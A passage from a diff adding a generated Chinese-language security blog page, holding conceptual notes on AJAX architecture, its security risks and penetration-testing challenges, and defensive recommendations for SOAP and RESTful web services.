+<li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li>
+<li>通过客户端脚本动态更新页面部分内容，而非整个页面</li>
+<li>降低带宽使用，提高速度</li>
+<li>提升用户体验</li>
+<li>后台异步访问</li>
+</ul>
+</li>
+<li>AJAX组件<ul>
+<li>JavaScript: ajax的核心组件，使用XMLHTTPRequest 对象接口向服务器发起请求，接收并处理服务器响应数据</li>
+</ul>
+</li>
+<li>Dynamic HTML(DHTML)<ul>
+<li>早于AJAX出现，通过JavaScript，CSS等在客户端修改HTML页面element，缺点是完全依赖客户端代码修改页面，与服务器的交互由JavaScript applets完成，AJAX的XHR弥补了他的缺点（注册用户）</li>
+</ul>
+</li>
+<li>Document Object Model(DOM)<ul>
+<li>处理html,xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的Properties,method,event</li>
+</ul>
+</li>
+<li>基于AJAX的web应用工作流程<ul>
+<li>XMLHTTPRequest API 创建对象xmlhttp进行访问</li>
+<li>XML，JSON，HTML，文本，图片</li>
+<li>多个异步请求独立通信，互不依赖</li>
+<li>AJAX框架<ul>
+<li>JQuery</li>
+<li>Dojo Toolkit </li>
+<li>Google web toolkit(GWT)</li>
+<li>Microsoft AJAX library</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>目前没有通用的AJAX安全最佳实践，其攻击面不为大多数人所知</li>
+<li>AJAX的安全问题<ul>
+<li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li>
+<li>AJAX引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过</li>
+<li>服务器，客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露</li>
+<li>暴露应用程序逻辑</li>
+</ul>
+</li>
+<li>AJAX对渗透测试的挑战<ul>
+<li>异步请求数量多且隐蔽</li>
+<li>触发AJAX请求的条件无规律</li>
+<li>手动和截断代理爬网可能产生大量遗漏</li>
+</ul>
+</li>
+<li>AJAX爬网工具<ul>
+<li>ZAP</li>
+</ul>
+</li>
+<li>客户端代码审计<ul>
+<li>源码</li>
+<li>firebug</li>
+</ul>
+</li>
+<li>web Service<ul>
+<li>面向服务的架构（service oriented architecture) 便于不同系统集成共享数据和功能</li>
+<li>尤其适合不想暴露数据模型和程序逻辑而访问数据的场景</li>
+<li>无页面</li>
+</ul>
+</li>
+<li>两种类型的web service<ul>
+<li>Simple object access protocol （SOAP）<ul>
+<li>传统的web service 开发方法，xml是唯一的数据交换格式</li>
+<li>要求安全性的应用更多采用</li>
+</ul>
+</li>
+<li>RESTFUL（Representational State Transfer architecture— REST)<ul>
+<li>目前更多被采用的轻量web service, JSON 是首选数据交换格式</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Web Service 安全考虑<ul>
+<li>使用API key或session token实现和跟踪身份认证</li>
+<li>身份认证由服务器完成，而非客户端</li>
+<li>API key,用户名，Session token 永远不要通过URL发送</li>
+<li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li>
+<li>SOAP 提供强于HTTPS的WS-security机制</li>
+<li>使用OAuth 或 HMAC 进行身份认证，HMAC身份认证使用C/S共享的密钥加密API key</li>
+<li>RESTful应只允许身份认证用户使用PUT，DELETE方法</li>
+<li>使用随机token防止CSRF攻击</li>
+<li>对用户提交参数过滤，建议部署基于严格白名单的方法</li>
+<li>报错消息消毒</li>
+<li>直接对象引用应严格身份验证（电商公司以ID作为主索引）</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BEEF"><span class="toc-number">1.1.</span> <span class="toc-text">BEEF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEBSHELL"><span class="toc-number">1.3.</span> <span class="toc-text">WEBSHELL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTPS攻击"><span class="toc-number">1.4.</span> <span class="toc-text">HTTPS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL-中间人攻击"><span class="toc-number">1.4.1.</span> <span class="toc-text">SSL 中间人攻击</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/04/23/XSS漏洞等笔记/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&text=XSS漏洞等笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&is_video=false&description=XSS漏洞等笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS漏洞等笔记&body=Check out this article: http://yoursite.com/2018/04/23/XSS漏洞等笔记/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&name=XSS漏洞等笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 jsmhny
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
